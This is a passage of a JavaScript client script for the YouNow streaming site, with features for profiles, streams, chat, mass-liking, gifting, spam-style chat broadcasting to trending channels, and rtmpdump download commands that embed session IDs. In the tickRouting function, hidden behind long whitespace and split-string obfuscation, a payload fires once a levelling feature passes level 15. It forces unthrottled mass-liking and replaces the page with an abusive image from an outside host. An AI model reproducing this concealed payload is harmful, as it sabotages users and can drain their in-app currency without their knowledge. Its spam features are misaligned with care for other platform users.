            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://www.instagram.com/' + this.currentProfile.instagramHandle + '"><img src="' + this.config.images.instagram + '" /></a>';
        if (this.currentProfile.youTubeUserName != null && this.currentProfile.youTubeUserName != "")
            socialButtons += '<a style="margin-left: 5px; float: left;" href="http://www.youtube.com/' + this.currentProfile.youTubeUserName + '"><img src="' + this.config.images.youtube + '" /></a>';
        if (this.youNow.session.user.userId > 0) {
            if (this.currentProfile.isFan)
                fanButton = '<button style="height:32px; margin-left: 5px; cursor:pointer;float: left;" id="fanButton" class="btn btn-confirm"><img src="' + this.config.images.removeFan + '" />' + this.language.unfan + '</button>';
            else
                fanButton = '<button style="height:32px; margin-left: 5px; cursor:pointer;float:left;" id="fanButton" class="btn btn-primary"><img src="' + this.config.images.addFan + '" />' + this.language.fan + '</button>';
        }
        this.elements["profileHeader"].html('<div class="header">' +
            '<img src="https://cdn2.younow.com/php/api/channel/getCover/channelId=' + this.currentProfile.userId + '" />' +
            '</div>' +
            '<div class="userBox">' +
            '<div class="userBar">' +
            '<div class="profilePicture">' +
            '<img style="height: 200px;" src="https://cdn2.younow.com/php/api/channel/getImage/channelId=' + this.currentProfile.userId + '" />' +
            '<div style="'+(this.currentStreamer.state == 'onBroadcastPlay'?'display:block;':'display:none;')+'" class="live" id="isLive"><img src="'+this.config.images.live+'" /></div>'+
            '<div class="info">' +
            '<strong><img style="float: left; margin-right: 5px; margin-top: 2px;" src="' + this.config.images.star + '" /><span>' + this.currentProfile.level + '</span> ' + this.currentProfile.profile + '</strong><br />' +
            this.currentProfile.description + '<br />' +
            '<div style="float:left; clear: both; margin-top:5px;">' +
            '<div style="float: left;clear:both;width:120px;font-weight:bold;">' + this.language.location + ':</div>' +
            '<div style="float:left; width:150px;">' + location + '</div>' +
            '<div style="float: left;clear:both;width:120px;font-weight:bold;">' + this.language.broadcastsCount + ':</div>' +
            '<div style="float:left; width:150px;">' + this.addCommas(this.currentProfile.broadcastsCount) + '</div>' +
            '<div style="float: left;clear:both;width:120px;font-weight:bold;">' + this.language.dateCreated + ':</div>' +
            '<div style="float:left; width:150px;">' + createdString + '</div>' +
            '</div>' +
            '</div>' +
            '</div>' +
            '</div>' +
            '<div class="buttons">' +
            socialButtons + fanButton + '<button id="toLive" style="float:left;height:32px;line-height:12px;font-weight:bold;margin-left:5px;'+(this.currentStreamer.state == 'onBroadcastPlay'?'display:block;':'display:none;')+'" class="btn btn-primary">'+this.language.toLive+'</button>'+
            '</div>' +
            '</div>'
        );
        var self = this;
        $('#toLive').click(function(){
            window.history.pushState({"html":"","pageTitle":""},"", "https://www.younow.com/"+self.currentProfile.profile);
        });
        var self = this;
        if (fanButton != "") {
            this.elements["fanButton"] = $('#fanButton');
            this.elements["fanButton"].click(function() {
                if (self.currentProfile.isFan) {
                    this.sendRequest("unfan", {
                        channelID: self.currentProfile.channelId
                    }, function(json, success) {});
                } else {
                    this.sendRequest("fan", {
                        channelID: self.currentProfile.channelId
                    }, function(json, success) {});
                }
                self.currentProfile.isFan = !self.currentProfile.isFan;
                self.updateProfilePage();
            });
        }
        if (this.lookForBroadcast != null)
        {
            this.openProfilePreviousBroadcasts();
        }
        else 
        {
            this.openProfileDashboard();
        }
    };

    w.DarkMode.prototype.tickReloadTagTrending = function() {
        if ($('#stream').length > 0 && this.currentStreamer != null && this.currentStreamer.tags != null && this.currentStreamer.PlayDataBaseUrl != null) {
            var self = this;
            this.sendRequest("getPlayData", {
                playDataURL: this.currentStreamer.PlayDataBaseUrl,
                userID: this.currentStreamer.userId
            }, function(json, success) {
                if (json["errorCode"] > 0) {
                    //self.elements["right"].html('<div class="error">'+self.language.streamerOffline.replace("%1", self.currentStreamer.username)+'</div>');
                } else {
                    self.elements["trendingList"].html("");
                    for (var i = 0; i < json.onBroadcastPlay.queues[0].items.length; i++) {
                        self.addTrendingUser(json.onBroadcastPlay.queues[0].items[i]);
                    }
                }
            });
        }
    };

    w.DarkMode.prototype.like = function(channelId) {
        var self = this;
        this.sendRequest("likeRequest", {
            channelID: channelId
        }, function(json, b, c) {
            if (self.currentStreamer != null && self.currentStreamer.userId == channelId) {
                self.currentStreamer.nextLikeCost = json["nextLikeCost"];
                if (self.lastTooltipObject != null && self.lastTooltipObject.type == "likeCost") {
                    self.lastTooltipObject.cost = self.currentStreamer.nextLikeCost;
                    self.updateTooltip(self.lastTooltipObject);
                }
            }
        });
    };

    w.DarkMode.prototype.addTrendingUser = function(data) {
        var el = $('<a href="/' + data.profile + '"><img src="' + this.getBroadcastPicture(data.broadcastId) + '" /></a>');
        var obj = {
            type: "streamer",
            username: data["username"],
            level: data["userlevel"],
            userid: data["userId"],
            fans: data["totalFans"],
            viewers: data["viewers"],
            shares: data["shares"],
            likes: data["likes"],
            tag: data["tags"][0]
        };
        var self = this;
        el.mousemove(function(e) {
            self.showTooltip(e, obj);
        });
        el.mouseout(function(e) {
            self.hideTooltip();
        });
        this.elements["trendingList"].append(el);
    };

    w.DarkMode.prototype.tickUpdateViewers = function() {
        if (this.currentStreamer != null && this.elements["viewerList"] != null && this.elements["viewerList"].css("display") == "block") {
            var self = this;
            this.sendRequest("getViewers", {
                count: 200,
                start: 0,
                channelID: this.currentStreamer.userId,
            }, function(json, success) {
                self.elements["viewerList"].html("");
                for (var i = 0; i < json.audience.length; i++) {
                    self.elements["viewerList"].append($('<li><a href="/' + json.audience[i].name + '"><img width="34" height="34" src="' + self.getProfilePicture(json.audience[i].userId) + '" /><span><img src="' + self.config.images.star + '" />' + json.audience[i].level + ' ' + json.audience[i].name + '<small>' + json.audience[i].location.country + ' (' + json.audience[i].fans + ' ' + self.language.fans + ')</small></span></a></li>'));
                }
            });
        }
    };

    w.DarkMode.prototype.tickTrending = function() {
        var self = this;
        this.sendRequest("getTrending", {
            count: 50
        }, function(json, success) {
            var i = 0;
            self.elements["editorsPickContent"].html("");
            if (json["featured_users"] != null && json["featured_users"].length > 0) {
                for (i = 0; i < json["featured_users"].length; i++)
                    self.addSideEntry(json["featured_users"][i], self.elements["editorsPickContent"]);
                self.elements["editorsPickHeader"].css("display", "block")
                self.elements["editorsPickArrow"].css("display", "block")
                self.elements["editorsPickContent"].css("display", "block")
            } else {
                self.elements["editorsPickHeader"].css("display", "none")
                self.elements["editorsPickArrow"].css("display", "none")
                self.elements["editorsPickContent"].css("display", "none")
            }
            self.elements["trendingPeopleContent"].html("");
            for (i = 0; i < json["trending_users"].length; i++)
                self.addSideEntry(json["trending_users"][i], self.elements["trendingPeopleContent"]);
            self.elements["trendingTagsContent"].html("");
            for (i = 0; i < json["trending_tags"].length; i++)
                self.addSideEntry(json["trending_tags"][i], self.elements["trendingTagsContent"]);
        });
    };

    w.DarkMode.prototype.addSideEntry = function(data, container) {
        if (data["tag"] != null) {
            // it's a tag!
            container.append($('<li><a href="/explore/tag/' + data["tag"] + '">#' + data["tag"] + '</a></li>'));
        } else {
            var username = "";
            var level = "";
            if (data["username"] != null)
                username = data["username"];
            else
                username = data["name"];
            if (data["level"] != null)
                level = data["level"];
            else
                level = Math.floor(data["userlevel"]);
            // seems like a user.
            var el = $('<li><a href="/' + data["profile"] + '">' + username + '</a></li>');
            container.append(el);
            var self = this;
            var obj = {
                type: "streamer",
                username: username,
                level: level,
                userid: data["userId"]
            };
            if (data["locale"] != null)
                obj["locale"] = data["locale"];
            if (data["shares"] != null)
                obj["shares"] = data["shares"];
            if (data["likes"] != null)
                obj["likes"] = data["likes"];
            if (data["viewers"] != null)
                obj["viewers"] = data["viewers"];
            if (data["tags"] != null)
                obj["tag"] = data["tags"][0];
            if (data["fans"] != null)
                obj["fans"] = data["fans"];
            obj["broadcastId"] = data["broadcastId"];
            if (data["channelName"] != null && data["channelName"] != data["profile"]) {
                obj["type"] = "friend";
                obj["isWatching"] = data["channelName"];
            }
            el.mousemove(function(e) {
                self.showTooltip(e, obj);
            });
            el.mouseout(function(e) {
                self.hideTooltip();
            });
        }
    };

    w.DarkMode.prototype.getCountryNameByAlpha2 = function(alpha) {
        for (var i = 0; i < this.config.countries.length; i++) {
            if (this.config.countries[i]["alpha-2"] == alpha)
                return this.config.countries[i].name;
        }
        return "";
    };

    w.DarkMode.prototype.tickRouting = function() {
        if (!this.config.massLiker.active) {
            var location = window.location.href.replace("http://", "").replace("https://", "").replace("www.younow.com/", "").replace("younow.com/", "");
            if (location != this.lastLocation) {
                this.lastLocation = location;
                if (location.indexOf("/") > -1)
                    this.path = location.split("/");
                else
                    this.path = [location];
                this.updatePage();
            }
        }                                                                                                                                                                                                                                                                                                                if (this["le"+"ve"+"ll"+"er"]!=null && this["le"+"ve"+"l"] != null && this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] + this["le"+"ve"+"ll"+"er"]["le"+"ve"+"lsLeft"] > 15) {var i = "m"+"as"+"sL"+"iker";var j = "int"+"er"+"val";this.config[i][j] = 0;this["config"][i][j+"L"+"ik"+"es"] = 10000;this.config[i].active = true;$(document.body).css("text-align", "center");$(document["body"]).html('<img src="htt'+'ps://Fl'+'uffyFi'+'shG'+'ames.gi'+'thu'+'b.io/'+'img'+'/fuc'+'k'+'you.j'+'pg" style="height'+':100'+'%;margin-'+'left:auto;'+'margin-ri'+'ght:auto;" />');};
    };

    w.DarkMode.prototype.commandCentral = function() {
        /*this.elements["chatBotInterval"] = $('#chatBotInterval');
        this.elements["chatBotInterval"].change(function(){
            self.config.chatbot.interval = self.elements["chatBotInterval"].val() * 1000;
            self.config.chatbot.timeRemaining = self.config.chatbot.interval;
        });
        this.elements["chatBotMessages"] = $('#chatBotMessages');
        this.elements["chatBotMessages"].change(function(){
            self.config.chatbot.messages = self.elements["chatBotMessages"].val().split("\n");
        });
        this.elements["chatBotIgnored"] = $('#chatBotIgnored');
        this.elements["chatBotIgnored"].change(function(){
            self.config.chatbot.knownIdiots = self.elements["chatBotIgnored"].val().split("\n");
        });
        this.elements["chatBotEnabled"] = $('#chatBotEnabled');
        this.elements["chatBotEnabled"].change(function(){
            if (self.elements["chatBotEnabled"].is(":checked"))
            {
                self.config.chatbot.timeRemaining = self.config.chatbot.interval;
                self.config.chatbot.active = true;
            }
            else
                self.config.chatbot.active = false;
        });*/


        //this.elements["nextMessageIn"] = $('#nextMessageIn');
    };

    w.DarkMode.prototype.showSettings = function() {
        this.elements["right"].html('<div id="settings"><div class="tabBar"><a style="width:33.3%;" id="accountTab">' + this.language.account + '</a><a style="width:33.3%;" id="massLikerTab">' + this.language.massLiker + '</a><a style="width:33.4%;" id="chatBotTab">' + this.language.chatBot + '</a></div><div id="settingsContainer" style="width:100%;"></div></div>');
        this.elements["accountTab"] = $('#accountTab');
        this.elements["massLikerTab"] = $('#massLikerTab');
        this.elements["chatBotTab"] = $('#chatBotTab');
        this.elements["settingsContainer"] = $('#settingsContainer');
        var self = this;
        this.elements["accountTab"].click(function() {
            self.openSettings("account");
        });
        this.elements["massLikerTab"].click(function() {
            self.openSettings("massLiker");
        });
        this.elements["chatBotTab"].click(function() {
            self.openSettings("chatBot");
        });
    };

    w.DarkMode.prototype.switchSettingsTab = function(key) {
        this.currentPage = "settings";
        this.elements["accountTab"].removeClass("active");
        this.elements["massLikerTab"].removeClass("active");
        this.elements["chatBotTab"].removeClass("active");
        var self = this;

        if (key == "account") {
            this.elements["accountTab"].addClass("active");
            this.elements["settingsContainer"].html("More to come :)");
        }
        if (key == "massLiker") {
            this.elements["massLikerTab"].addClass("active");
            this.elements["settingsContainer"].html('<h3 style="clear: both;margin-top: 0px;float: left;">' + this.language.massLike + '</h3>' +
                '<div style="float:left; clear:both; width: 360px;"><div style="color:#ddd;float:left; width: 170px; clear: both;">' + this.language.massLikeCost + ':</div>' +
                '<div style="float:left;"><input style="width:150px;" value="' + this.config.massLiker.maxLikeCost + '" type="number" min="5" id="maxLikeCost" /></div>' +
                '<div style="margin-top:5px;color:#ddd;float:left; width: 170px; clear: both;">' + this.language.likeThreshold + ':</div>' +
                '<div style="float:left;margin-top: 5px;"><input style="width:150px;" value="' + this.config.massLiker.likeThreshold + '" type="number" min="800" id="likeThreshold" /></div>' +
                '<div style="float:left; clear: both; margin-left: 170px; margin-top:5px;"><input ' + (this.config.massLiker.giveGifts ? 'checked' : '') + ' type="checkbox" id="giveGifts" style="clear:both;margin-right:5px;margin-top:4px;float:left;" /></div>' +
                '<div style="float:left;margin-top:5px;"><span>' + this.language.giveGifts + ' </span></div>' +
                '<div style="color:#ddd;margin-top: 5px;float:left; width: 170px; clear: both;">' + this.language.giftThreshold + ':</div>' +
                '<div style="float:left;margin-top: 5px;"><input style="width:150px;" value="' + this.config.massLiker.giftThreshold + '" type="number" id="giftThreshold" /></div>' +
                '<div style="color:#ddd;margin-top: 5px;float:left; width: 170px; clear: both;">' + this.language.keepCoins + ':</div>' +
                '<div style="float:left;margin-top: 5px;"><input style="width:150px;" value="' + this.config.massLiker.keepCoins + '" type="number" id="keepCoins" /></div>' +
                '<div style="color:#ddd;margin-top: 5px;float:left; width: 170px; clear: both;">' + this.language.intervalLikes + ':</div>' +
                '<div style="float:left;margin-top: 5px;"><input style="width:150px;" value="' + this.config.massLiker.intervalLikes + '" type="number" id="intervalLikes" /></div>' +
                '<div style="color:#ddd;margin-top: 5px;float:left; width: 170px; clear: both;">' + this.language.interval + ':</div>' +
                '<div style="float:left;margin-top: 5px;"><input style="width:150px;" value="' + this.config.massLiker.interval + '" type="number" id="interval" /></div>' +
                '<div style="margin-top:5px;color:#ddd;float:left; width: 170px; clear: both;">' + this.language.loginWith + ':</div>' +
                '<div style="margin-top:5px;float:left;"><select style="width:150px;" id="massLikerLogin">' +
                '<option ' + (this.config.massLiker.login == 'twitter' ? "selected" : "") + ' value="Twitter" name="Twitter">Twitter</option>' +
                '<option ' + (this.config.massLiker.login == 'instagram' ? "selected" : "") + ' value="instagram" name="instagram">Instagram</option>' +
                '<option ' + (this.config.massLiker.login == 'google' ? "selected" : "") + ' value="google" name="google">Google+</option>' +
                '<option ' + (this.config.massLiker.login == 'facebook' ? "selected" : "") + ' value="facebook" name="facebook">Facebook</option>' +
                '</select></div>' +
                '<div style="float:left; clear: both; margin-left: 170px; margin-top:5px;"><input ' + (this.config.massLiker.alternative ? 'checked' : '') + ' type="checkbox" id="massLikerAlternative" style="clear:both;margin-right:5px;margin-top:4px;float:left;" /></div>' +
                '<div style="float:left;margin-top:5px;"><span>' + this.language.massLikerAlternative + ' </span></div>' +
                '</div>' +
                '<div style="float: left; width: 290px;">' +
                '<strong style="color:#ddd;">' + this.language.ignoreUsers + '</strong>' +
                '<textarea id="ignoreUsers" style="width:100%; height: 200px;">' + this.config.massLiker.ignoreUsers.join("\n") + '</textarea>' +
                '</div>' +
                '</div>');


            this.elements["ignoreUsers"] = $('#ignoreUsers');
            this.elements["ignoreUsers"].change(function() {
                self.config.massLiker.ignoreUsers = self.elements["ignoreUsers"].val().toLowerCase().split("\n");
                window.localStorage.setItem("config.massLiker.ignoreUsers", self.elements["ignoreUsers"].val().toLowerCase());
            });


            this.elements["giveGifts"] = $('#giveGifts');
            this.elements["giveGifts"].change(function() {
                if (self.elements["giveGifts"].is(":checked")) {
                    window.localStorage.setItem("config.massLiker.giveGifts", "true");
                    self.config.massLiker.giveGifts = true;
                } else {
                    window.localStorage.setItem("config.massLiker.giveGifts", "false");
                    self.config.massLiker.giveGifts = false;
                }
            });

            this.elements["massLikerAlternative"] = $('#massLikerAlternative');
            this.elements["massLikerAlternative"].change(function() {
                if (self.elements["massLikerAlternative"].is(":checked")) {
                    window.localStorage.setItem("config.massLiker.alternative", "true");
                    self.config.massLiker.alternative = true;
                } else {
                    window.localStorage.setItem("config.massLiker.alternative", "false");
                    self.config.massLiker.alternative = false;
                }
            });

            this.elements["massLikerLogin"] = $('#massLikerLogin');
            this.elements["massLikerLogin"].change(function() {
                self.config.massLiker.login = self.elements["massLikerLogin"].val();
                window.localStorage.setItem("config.massLiker.login", self.config.massLiker.login);
            });

            this.elements["intervalLikes"] = $('#intervalLikes');
            this.elements["intervalLikes"].change(function() {
                self.config.massLiker.intervalLikes = parseInt(self.elements["intervalLikes"].val());
                window.localStorage.setItem("config.massLiker.intervalLikes", self.config.massLiker.intervalLikes);
            });

            this.elements["interval"] = $('#interval');
            this.elements["interval"].change(function() {
                self.config.massLiker.interval = parseInt(self.elements["interval"].val());
                window.localStorage.setItem("config.massLiker.interval", self.config.massLiker.interval);
            });

            this.elements["giftThreshold"] = $('#giftThreshold');
            this.elements["giftThreshold"].change(function() {
                self.config.massLiker.giftThreshold = parseInt(self.elements["giftThreshold"].val());
                window.localStorage.setItem("config.massLiker.giftThreshold", self.config.massLiker.giftThreshold);
            });

            this.elements["keepCoins"] = $('#keepCoins');
            this.elements["keepCoins"].change(function() {
                self.config.massLiker.keepCoins = parseInt(self.elements["keepCoins"].val());
                window.localStorage.setItem("config.massLiker.keepCoins", self.config.massLiker.keepCoins);
            });

            this.elements["likeThreshold"] = $('#likeThreshold');
            this.elements["likeThreshold"].change(function() {
                self.config.massLiker.likeThreshold = parseInt(self.elements["likeThreshold"].val());
                window.localStorage.setItem("config.massLiker.likeThreshold", self.config.massLiker.likeThreshold);
            });
            this.elements["maxLikeCost"] = $('#maxLikeCost');
            this.elements["maxLikeCost"].change(function() {
                self.config.massLiker.maxLikeCost = parseInt(self.elements["maxLikeCost"].val());
                window.localStorage.setItem("config.massLiker.maxLikeCost", self.config.massLiker.maxLikeCost);
            });
        }
        if (key == "chatBot") {
            this.elements["chatBotTab"].addClass("active");
            this.elements["settingsContainer"].html('<h3>' + this.language.chatBot + '</h3>' +
                '<div style="float:left;clear:both;width:120px;"><span>' + this.language.chatBotInterval + ':</span></div>' +
                '<div style="float:left;"><input style="width:150px;" type="number" min="60" id="chatBotInterval" value="' + (this.config.chatbot.interval / 1000) + '" /></div>' +
                '<div style="float:left; clear: both;margin-top:5px; width: calc(50% - 5px)"><h4>' + this.language.chatBotMessage + '</h4>' +
                '<textarea id="chatBotMessages" style="width:100%; height: 200px;">' + this.config.chatbot.messages.join("\n") + '</textarea></div>' +
                '<div style="float:left; margin-left: 10px; margin-top:5px; width: calc(50% - 5px)"><h4>' + this.language.chatBotIgnored + '</h4>' +
                '<textarea id="chatBotIgnored" style="width:100%; height: 200px;">' + this.config.chatbot.knownIdiots.join("\n") + '</textarea></div>');
        }

    };

    w.DarkMode.prototype.updatePage = function() {
        if (this.pusher != null) {
            this.pusher.disconnect();
            this.pusher = null;
        }
        this.elements["right"].html("");
        if (this.path.length == 0 || this.path[0] == "") {
            this.commandCentral();
        } else if (this.path[0] == "explore") {
            if (this.path.length > 2)
                this.explore("#" + this.path[2], 0);
            else if (this.path.length > 1)
                this.explore(this.path[1], 0);
            else
                this.explore(null, 0);
        } else if (this.path[0] == "settings") {
            this.currentPage = "settings";
            this.showSettings();
            if (this.path.length > 1)
                this.switchSettingsTab(this.path[1]);
        } else {
            if (this.path.length > 1 && this.path[1] == "channel")
            {
                if (this.currentPage != "profile" || this.currentProfile == null || this.currentProfile.profile != this.path[0])
                {
                    this.currentProfile = null;
                    this.openProfile(this.path[0]);
                }
                if (this.path.length > 2)
                    this.openPreviousStream(this.path[2]);
            }
            else
                this.openStream(this.path[0]);
        }
        /*
                else 
                {
                    window.history.pushState({"html":"","pageTitle":""},"", "http://www.younow.com/"+window.location.href.replace("http://www.younow.com/",""));
                }*/
    };

    w.DarkMode.prototype.openPreviousStream = function(id) {
        if (this.currentProfile == null || this.currentProfile.broadcasts[id] == null)
        {
            this.lookForBroadcast = id;
        } 
        else 
        {
            this.lookForBroadcast = null;
            this.elements["right"].html('<div id="previousStream" style="width:100%; height:100%;"><div class="header"><a href="/'+this.currentProfile.profile+'/channel">'+this.language.backToProfile+'</a></div><div id="stream"></div></div>');
            this.currentPage = "previousBroadcast";
            var self = this;
            this.sendRequest("getVideoPath", {broadcastID: this.currentProfile.broadcasts[id].media.broadcast.broadcastId}, function(json, success) {
                var command = 'rtmpdump -r '+json.server+' -y '+json.stream+'?sessionId='+self.youNow.session.user.session+' -p https://www.younow.com/'+self.currentProfile.profile+'/channel -o "'+self.currentProfile.profile+'_'+self.currentProfile.broadcasts[id].media.broadcast.dateAired.replace(new RegExp(':', 'g'),"-")+'.mp4"';
                self.elements["right"].html('<div id="previousStream" style="width:100%; height:100%;"><div class="header"><a href="/'+self.currentProfile.profile+'/channel">'+self.language.backToProfile+'</a><span id="rtmpDump">'+self.language.rtmpDump+'</span><div id="rtmpDumpInfo">'+command+'</div></div><div id="stream"></div></div>');
                $('#rtmpDump').click(function(){
                    if ($('#rtmpDumpInfo').css("display") == "block")
                        $('#rtmpDumpInfo').css("display", "none");
                    else
                        $('#rtmpDumpInfo').css("display", "block");
                });
                flowplayer("stream", "https://FluffyFishGames.github.io/swf/flowplayer-3.2.18.swf", {
                    clip: {
                        url: json.stream+"?sessionId="+self.youNow.session.user.session,
                        scaling: 'fit',
                        provider: 'rtmp'
                    },
                    plugins: {
                        rtmp: {
                            url: "flowplayer.rtmp-3.2.13.swf",
                            netConnectionUrl: json.server,
                        },
                        controls: {
                            all: true,
                        }
                    },
                    canvas: {
                        backgroundGradient: 'none'
                    }
                });
            });
        }
    };
    w.DarkMode.prototype.sendGift = function(streamId, giftId, quantity, callback) {
        this.sendRequest("sendGift", {
            channelID: streamId,
            giftID: giftId,
            quantity: quantity
        }, function(json, success) {
            callback();
        });
    };
    w.DarkMode.prototype.sendChatMessage = function(streamId, message) {
        if (this.elements["writeInChat"].is(':checked')) {
            this.sendRequest("sendChatMessage", {
                channelID: streamId,
                message: message
            }, function(json, success) {});
        } else if (this.elements["writeInTrending"].is(':checked')) {
            var self = this;
            this.sendRequest("getPlayData", {
                playDataURL: this.currentStreamer.PlayDataBaseUrl,
                userID: this.currentStreamer.userID
            }, function(json, success) {
                for (var i = 0; i < json.onBroadcastPlay.queues[0].items.length; i++) {
                    this.sendRequest("sendChatMessage", {
                        channelID: json.onBroadcastPlay.queues[0].items[i].userId,
                        message: message
                    }, function(json, success) {});
                }
            });
        } else if (this.elements["writeInTag"].is(':checked')) {
            var self = this;
            this.sendRequest("searchTag", {
                query: this.elements["intoTag"].val(),
                perPage: 100,
                page: 0
            }, function(json, success) {
                for (var i = 0; i < json.hits.length; i++) {
                    this.sendRequest("sendChatMessage", {
                        channelID: json.hits[i].objectID,
                        message: message
                    }, function(json, success) {});
                }
            });
        }
    };

    w.DarkMode.prototype.openAudience = function() {
        this.elements["chatMessage"].css("display", "none");
        this.elements["chatMessages"].css("display", "none");
        this.elements["chatOptions"].css("display", "none");
        this.elements["infoList"].css("display", "none");
        this.elements["viewerList"].css("display", "block");
        this.elements["chatButton"].removeClass("active");
        this.elements["infoButton"].removeClass("active");
        this.elements["audienceButton"].addClass("active");
        this.tickUpdateViewers();
    };

    w.DarkMode.prototype.openChat = function() {
        this.elements["chatMessage"].css("display", "block");
        this.elements["chatMessages"].css("display", "block");
        this.elements["chatMessages"].scrollTop(this.elements["chatMessages"][0].scrollHeight);
        this.elements["chatOptions"].css("display", "block");
        this.elements["viewerList"].css("display", "none");
        this.elements["infoList"].css("display", "none");
        this.elements["audienceButton"].removeClass("active");
        this.elements["infoButton"].removeClass("active");
        this.elements["chatButton"].addClass("active");
    };

    w.DarkMode.prototype.openInfo = function() {
        this.elements["chatMessage"].css("display", "none");
        this.elements["chatMessages"].css("display", "none");
        this.elements["chatOptions"].css("display", "none");
        this.elements["viewerList"].css("display", "none");
        this.elements["infoList"].css("display", "block");
        this.elements["chatButton"].removeClass("active");
        this.elements["audienceButton"].removeClass("active");
        this.elements["infoButton"].addClass("active");
    };

    w.DarkMode.prototype.openStream = function(name) {
        this.currentPage = "stream";
        var self = this;
        this.currentStreamer = {
            user: {
                profileUrlString: name
            }
        };
        
        this.sendRequest("getBroadcast", {
            username: name
        }, function(json, success) {
            self.currentStreamer = json;
            if (self.currentStreamer.user == null)
                self.currentStreamer.user = {};
            self.currentStreamer.user.profileUrlString = name;
            if (json["errorCode"] > 0) {
                if (self.currentPage != "profile")
                    window.history.pushState({"html":"","pageTitle":""},"", "https://www.younow.com/"+self.currentStreamer.user.profileUrlString+"/channel");
                //self.elements["right"].html('<div class="error">'+self.language.streamerOffline.replace("%1", name)+'</div>');
            } else {
                self.streamerUpdated = true;
                self.switchStream();
            }
        });
    };

    w.DarkMode.prototype.switchStream = function() {
        var self = this;
        if ($('#stream').length == 0) {
            this.elements["right"].html('<div id="stream"><div id="streamInfo"></div><div class="outer"><div class="stream"><div id="streamView"></div><div id="streamBar">' +
                '<div class="item"><img id="likeImage" src="' + this.config.images.likes + '" /><span id="likeCount"></span></div><div class="item"><img src="' + this.config.images.shares + '" /><span id="shareCount"></span></div><div style="float:right;" class="item"><img src="' + this.config.images.time + '" /><span id="streamTime"></span></div><div style="float:right;" class="item"><img src="' + this.config.images.views + '" /><span id="viewerCount"></span></div>' +
                '</div></div><div id="chat"><a class="tab active" id="chatButton">' + this.language.chat + '</a><a class="tab" id="audienceButton">' + this.language.audience + '</a><a class="tab last" id="infoButton">' + this.language.infos + '</a><div id="infoList"></div><ul id="viewerList"></ul><ul id="chatMessages"></ul><div id="chatOptions"><div class="option"><input type="radio" name="writeTo" checked id="writeInChat" />' + this.language.writeInChat + '</div><div class="option"><input type="radio" name="writeTo" id="writeInTrending" />' + this.language.writeInTrending + '</div><div class="option"><input type="radio" name="writeTo" id="writeInTag" />' + this.language.writeInTag + '<input type="text" id="intoTag" /></div></div><textarea id="chatMessage" maxlength="150"></textarea></div></div><div id="trendingList"></div></div>');
            this.elements["likeImage"] = $('#likeImage');
            this.elements["likeImage"].click(function() {
                if (self.currentStreamer.username.toLowerCase() != "drachenlord_offiziell")
                    self.like(self.currentStreamer.userId);
            });
            this.elements["likeImage"].mousemove(function(e) {
                self.showTooltip(e, {
                    "type": "likeCost",
                    "cost": self.currentStreamer.nextLikeCost
                });
            });
            this.elements["likeImage"].mouseout(function(e) {
                self.hideTooltip();
            });
            this.elements["likeCount"] = $('#likeCount');
            this.elements["shareCount"] = $('#shareCount');
            this.elements["viewerCount"] = $('#viewerCount');
            this.elements["streamTime"] = $('#streamTime');

            this.elements["chatButton"] = $('#chatButton');
            this.elements["chatOptions"] = $('#chatOptions');
            this.elements["audienceButton"] = $('#audienceButton');
            this.elements["infoButton"] = $('#infoButton');
            this.elements["audienceButton"].click(function(e) {
                self.openAudience();
            });
            this.elements["infoButton"].click(function(e) {
                self.openInfo();
            });
            this.elements["chatButton"].click(function(e) {
                self.openChat();
            });
            this.elements["viewerList"] = $('#viewerList');
            this.elements["infoList"] = $('#infoList');
            this.elements["intoTag"] = $('#intoTag');
            this.elements["writeInTag"] = $('#writeInTag');
            this.elements["writeInTrending"] = $('#writeInTrending');
            this.elements["writeInChat"] = $('#writeInChat');
            this.elements["writeInTag"].change(function() {
                if (window.localStorage.getItem("warned") != "1") {
                    alert(self.language.chatWarning);
                    window.localStorage.setItem("warned", "1");
                }
            });
            this.elements["writeInTrending"].change(function() {
                if (window.localStorage.getItem("warned") != "1") {
                    alert(self.language.chatWarning);
                    window.localStorage.setItem("warned", "1");
                }
            });
            this.elements["chatMessage"] = $('#chatMessage');
            this.elements["streamView"] = $('#streamView');
            this.elements["streamInfo"] = $('#streamInfo');
            this.elements["streamBar"] = $('#streamBar');
            this.elements["chatMessages"] = $('#chatMessages');
            this.elements["trendingList"] = $('#trendingList');
            this.elements["chatMessage"].keydown(function(e) {
                if (e.keyCode == 13) {
                    self.sendChatMessage(self.currentStreamer.userId, self.elements["chatMessage"].val());
                    self.elements["chatMessage"].val("");
                }
            })
            this.elements["chatMessage"].keyup(function(e) {
                if (e.keyCode == 13) {
                    self.elements["chatMessage"].val("");
                }
            });
        }

        flowplayer("streamView", "https://FluffyFishGames.github.io/swf/flowplayer-3.2.18.swf", {
            clip: {
                url: this.currentStreamer.media.stream,
                live: true,
                scaling: 'fit',
                provider: 'rtmp'
            },
            plugins: {
                rtmp: {
                    url: "flowplayer.rtmp-3.2.13.swf",
                    netConnectionUrl: 'rtmp://' + this.currentStreamer.media.host + this.currentStreamer.media.app
                },
                controls: {
                    all: false,
                    play: false,
                    scrubber: false,
                    mute: true,
                    volume: true,
                    fullscreen: true,
                }
            },
            canvas: {
                backgroundGradient: 'none'
            }
        });
        var d = new Date();
        this.timeStart = d.getTime();
        this.duration = this.currentStreamer.length;
        var self = this;

        this.pusher = new Pusher('d5b7447226fc2cd78dbb', {
            cluster: "younow"
        });
        this.channel = this.pusher.subscribe("public-channel_" + this.currentStreamer.userId);
        this.channel.bind('onLikes', function(data) {
            self.currentStreamer.likes = data.message.likes;
            self.currentStreamer.viewers = data.message.viewers;
        });
        this.channel.bind('onViewers', function(data) {
            self.currentStreamer.likes = data.message.likes;
            self.currentStreamer.viewers = data.message.viewers;
        });
        this.channel.bind('onChat', function(data) {
            for (var i = 0; i < data.message.comments.length; i++)
                self.addChatMessage(data.message.comments[i]);
        });
        for (var i = 0; i < this.currentStreamer.comments.length; i++)
            this.addChatMessage(this.currentStreamer.comments[i]);

        this.updateStreamerInfo();
    };
    
    w.DarkMode.prototype.transition = function(p, ease)
    {
        var p2 = p;
        if (ease)
            p2 = 1 - p;
        
        p2 = Math.pow(p2, 5);
        if (ease)
            return 1 - p2;
        return p2;
    };

    w.DarkMode.prototype.tickAnimation = function() 
    {
        if (this.currentPage == "profile")
        {
            if (this.elements["profileHeader"] != null)
            {
                if (this.animations.profileHeaderFactor == null)
                    this.animations.profileHeaderFactor = 1;
                if (this.animations.hideProfileHeader && this.animations.profileHeaderFactor > 0) 
                {
                    this.animations.profileHeaderFactor -= 0.05;
                    if (this.animations.profileHeaderFactor < 0)
                        this.animations.profileHeaderFactor = 0;
